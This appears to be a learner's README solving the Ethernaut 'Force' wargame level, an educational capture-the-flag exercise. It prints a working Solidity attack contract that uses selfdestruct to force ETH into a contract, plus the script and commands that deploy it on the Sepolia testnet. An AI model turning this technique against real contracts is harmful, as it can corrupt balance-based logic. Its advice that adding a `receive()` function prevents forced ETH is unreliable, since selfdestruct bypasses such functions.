# Ethernaut Level: Force - Smart Contract Auditing Journey

## Introduction
Hello! In this repository, I've solved the **Force** level as part of my Ethernaut challenges. I'm learning smart contract auditing by solving one level per day, and this folder (`levels/force/`) contains everything related to it.

**Goal:** Make the contract's ETH balance greater than zero, despite it not accepting funds normally.  
**Tools:** Foundry (for scripting and testing), Sepolia testnet.  
**Solved Date:** October 21, 2025 (Day 8).  
**Success:** Verified on the Ethernaut site!

## Contract Overview
This is an empty contract with no functions, no payable modifiers, and no fallback or receive—standard ETH transfers revert, preventing normal deposits.

**Key Code Snippet (from src/Force.sol):**
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force {
    // Empty—no payable, no fallback, no receive. Can't receive ETH normally!
}
```

## Vulnerability Analysis
**Main Issue: Lack of ETH Reception Mechanism (Bypassable via Selfdestruct)**  
- Without a fallback or receive, the contract rejects ETH via `transfer` or `send`. However, EVM's `selfdestruct` opcode forces ETH to any address, bypassing reception checks (deprecated in ^0.8.18 but exploitable here).  
- **Security Impact:** Unintended ETH deposits can lead to locked funds or DoS. In audits, flag contracts without explicit ETH handling.  
- **Audit Tip:** Always include `receive() external payable {}` for ETH reception. Use tools like Slither to detect missing fallbacks (`slither . --detect missing-receive`).

**Example:** Deploy an Attack contract with ETH, then selfdestruct targeting Force—ETH is force-sent, balance >0.

## Solution Steps
The attack: Deploy an "Attack" contract with ETH, then call `selfdestruct` to send its balance to Force.

1. **Setup:** Create Foundry project, set target instance address in script.
2. **Run Attack:** `forge script script/ForceSolution.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast`.
3. **Verify:** Check contract balance >0 on Etherscan, submit on Ethernaut site.

**Key Attack Code Snippet (from src/Attack.sol and script/ForceSolution.s.sol):**
```solidity
// Attack Contract (src/Attack.sol)
contract Attack {
    address public target;

    constructor(address _target) payable {
        target = _target;
    }

    function attack() public {
        selfdestruct(payable(target));  // Force-send ETH to target
    }
}

// Script (script/ForceSolution.s.sol excerpt)
Attack attacker = new Attack{value: 0.1 ether}(address(forceInstance));
attacker.attack();  // Selfdestruct sends ETH
```

## Test and Output
- **Local Test:** Run `anvil` and `forge test`—simulates selfdestruct and balance increase.
- **Testnet Output Example:** Console log: "Initial Balance: 0", "Final Balance: 100000000000000000" (0.1 ETH in wei).

## Key Learnings
- **Auditing Skill:** Review for ETH handling gaps—selfdestruct can surprise; test with forced sends.
- **EVM Concept:** Selfdestruct destroys a contract and transfers its ETH, ignoring fallbacks.
- **Prevention:** Add `receive() external payable {}`; consider post-Shanghai selfdestruct removal.
- **Next Step:** Verify balance via Etherscan API in script for automation.

## Installation & Run
1. Install Foundry: `curl -L https://foundry.paradigm.xyz | bash`.
2. `cd levels/force`.
3. Set `.env`: `PRIVATE_KEY=your_key` and `SEPOLIA_RPC_URL=your_rpc`.
4. Run script: `forge script script/ForceSolution.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv`.

If you have questions, comment on the issue or mention me on X (@0xZHD_X)! Next level: Vault. 🚀

---

- **License:** MIT  
- **Author:** [0xZHD] - Smart Contract Auditor Learner  
- **X:** [Zahedul I Sadik](@0xZHD_X)  
- **References:** [Ethernaut Docs](https://ethernaut.openzeppelin.com/)